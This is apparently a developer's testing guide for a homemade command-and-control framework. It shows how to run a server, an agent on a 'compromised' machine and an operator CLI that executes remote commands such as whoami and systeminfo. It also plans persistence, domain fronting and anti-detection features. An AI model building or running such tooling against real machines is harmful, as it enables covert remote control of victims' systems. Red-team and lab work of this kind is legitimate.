# Testing the REAL C2 Framework

## What Changed?

**NO MORE SIMULATION!** The CLI now communicates with a REAL C2 server using HTTP REST API.

### Architecture

```
┌─────────────┐         HTTP API          ┌─────────────┐
│   Operator  │ ←──────────────────────→  │  C2 Server  │
│    (CLI)    │     REST Endpoints        │ (localhost) │
└─────────────┘                           └─────────────┘
                                                 ↑
                                                 │ HTTP
                                                 ↓
                                          ┌─────────────┐
                                          │    Agent    │
                                          │  (Target)   │
                                          └─────────────┘
```

## How to Test

### Terminal 1: Start the C2 Server

```powershell
cd D:\c2-phantom
.venv\Scripts\activate
phantom server --host 0.0.0.0 --port 8443
```

**Expected Output:**
```
🚀 Starting C2 Server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Server Configuration
────────────────────────────────────────
 Host: 0.0.0.0
 Port: 8443
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✓ C2 Server started successfully

⚡ Server is listening for connections...
```

**Leave this running!** The server must be active for CLI commands to work.

---

### Terminal 2: Start an Agent (Simulate Target Machine)

```powershell
cd D:\c2-phantom
.venv\Scripts\activate
python -m c2_phantom.agent --server http://localhost:8443
```

**Expected Output:**
```
[INFO] Registering with C2 server...
[INFO] Agent registered. Session ID: a1b2c3d4...
[INFO] Starting beacon loop...
[INFO] Beacon sent (jitter: 3.2s)
```

**This is your "compromised" machine.** The agent will:
- Register with the server
- Send heartbeat beacons every ~60 seconds
- Poll for commands to execute
- Execute commands using subprocess
- Send real output back to server

**Leave this running!** The agent must be active to execute commands.

---

### Terminal 3: Operator Console (Issue Commands)

```powershell
cd D:\c2-phantom
.venv\Scripts\activate
```

#### List Active Sessions

```powershell
phantom list --status active
```

**Expected Output:**
```
┏━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━┓
┃ Session  ┃ Target    ┃ User     ┃ OS        ┃ Status  ┃
┡━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━┩
│ a1b2c3d4 │ DESKTOP-X │ username │ Windows11 │ Active  │
└──────────┴───────────┴──────────┴───────────┴─────────┘
```

Copy the Session ID (e.g., `a1b2c3d4`) for the next step.

#### Execute Real Command

```powershell
phantom execute "whoami" --session a1b2c3d4 --output
```

**What Happens (Real Flow):**

1. **CLI** → HTTP POST to `http://localhost:8443/api/command`
   ```json
   {
     "session_id": "a1b2c3d4",
     "type": "execute",
     "command": "whoami"
   }
   ```

2. **Server** → Queues command in memory (`command_queues[session_id]`)
   - Returns `task_id` to CLI

3. **Agent** → Polls server GET `/tasks/a1b2c3d4`
   - Receives the command

4. **Agent** → Executes command using `subprocess.Popen`
   ```python
   process = subprocess.Popen(
       ["powershell", "-Command", "whoami"],
       stdout=subprocess.PIPE,
       stderr=subprocess.PIPE
   )
   ```

5. **Agent** → POST results to `/results/a1b2c3d4`
   ```json
   {
     "task_id": "task_123456",
     "output": "DESKTOP-X\\username",
     "error": "",
     "exit_code": 0
   }
   ```

6. **Server** → Stores result in `responses[session_id][task_id]`

7. **CLI** → Polls GET `/api/result/a1b2c3d4/task_123456`
   - Retrieves real output
   - Displays to operator

**Expected Output:**
```
╭─────────────────────────────────────────╮
│ 📤 Command Output                       │
├─────────────────────────────────────────┤
│ $ whoami                                │
│                                         │
│ ✓ SUCCESS                               │
│ Exit code: 0                            │
│                                         │
│ Output:                                 │
│ DESKTOP-X\username                      │
╰─────────────────────────────────────────╯

✓ Command executed successfully
```

**This is REAL output from `subprocess.Popen` on the agent machine!**

#### More Test Commands

```powershell
# Get current directory
phantom execute "pwd" --session a1b2c3d4 --output

# List files
phantom execute "Get-ChildItem" --session a1b2c3d4 --output

# System information
phantom execute "systeminfo | Select-String 'OS'" --session a1b2c3d4 --output

# Network interfaces
phantom execute "ipconfig /all" --session a1b2c3d4 --output
```

---

## Troubleshooting

### Error: "C2 server is not running!"

**Problem:** CLI can't connect to server.

**Solution:**
```powershell
# Terminal 1 - Start server
phantom server --host 0.0.0.0 --port 8443
```

---

### Error: "Command timed out"

**Problem:** Agent isn't running or not polling.

**Check:**
1. Is the agent running? (Terminal 2)
2. Check agent logs for errors
3. Check server logs - is agent sending beacons?

**Solution:**
```powershell
# Terminal 2 - Restart agent
python -m c2_phantom.agent --server http://localhost:8443
```

---

### Error: "Session not found"

**Problem:** Wrong session ID.

**Solution:**
```powershell
# List active sessions
phantom list --status active

# Copy the correct Session ID
phantom execute "whoami" --session <CORRECT_SESSION_ID> --output
```

---

## What's Real vs. Simulated?

### ✅ REAL (Fully Implemented)

- **C2 Server:** Real aiohttp HTTP server on port 8443
- **Agent:** Real Python agent using subprocess
- **Command Execution:** Real shell commands via `subprocess.Popen`
- **Network Communication:** Real HTTP REST API
- **Session Management:** Real JSON storage in `~/.phantom/sessions/`
- **Beacons:** Real periodic heartbeats from agent
- **Output:** Real stdout/stderr from commands
- **Error Handling:** Real exit codes and error messages

### 🟡 SIMULATED (Not Yet Implemented)

- **`phantom connect`:** Still creates fake sessions locally
  - **Fix:** Remove this command - agent.py handles registration
- **`phantom upload`:** Simulated file upload
  - **Next:** Implement base64 encoding + HTTP POST
- **`phantom download`:** Simulated file download
  - **Next:** Implement HTTP GET + base64 decoding

---

## Architecture Details

### REST API Endpoints

**Agent Endpoints (used by agent.py):**
- `POST /register` - Agent registration with system info
- `POST /beacon` - Heartbeat to maintain connection
- `GET /tasks/{session_id}` - Retrieve queued commands
- `POST /results/{session_id}` - Submit command results

**Operator Endpoints (used by CLI):**
- `GET /health` - Check if server is running
- `POST /api/command` - Queue command for agent
- `GET /api/result/{session_id}/{task_id}` - Get command result
- `GET /api/sessions` - List all sessions

### Data Flow

```
Operator Types Command
         ↓
    CLI (client.py)
         ↓ HTTP POST /api/command
    C2 Server (server.py)
         ↓ Store in command_queues[session_id]
    Agent Polls
         ↓ HTTP GET /tasks/{session_id}
    Agent Receives Command
         ↓ subprocess.Popen(command)
    Execute on Target OS
         ↓ Capture stdout/stderr
    Agent Submits Results
         ↓ HTTP POST /results/{session_id}
    C2 Server Stores Result
         ↓ responses[session_id][task_id]
    CLI Polls for Result
         ↓ HTTP GET /api/result/{session_id}/{task_id}
    Display to Operator
```

---

## Next Steps

1. **Test file upload/download:** Implement real base64 encoding
2. **Add encryption:** Enable AES-256-GCM for all communications
3. **Add persistence:** Implement agent auto-start mechanisms
4. **Add obfuscation:** Enable domain fronting and proxy chains
5. **Add stealth:** Implement anti-detection techniques

---

## Proof It's Real

**Before:** `phantom execute "whoami"` returned:
```
Command executed successfully
Exit code: 0
```
Generic fake output with `time.sleep(1)`.

**After:** `phantom execute "whoami"` returns:
```
DESKTOP-X\username
Exit code: 0
```
Real output from `subprocess.Popen` on the agent machine!

**The difference:**
- No more `time.sleep()` simulation
- Real HTTP communication
- Real subprocess execution
- Real stdout/stderr capture
- Real exit codes
- Real timestamps

**This is a REAL C2 framework!** 🎉
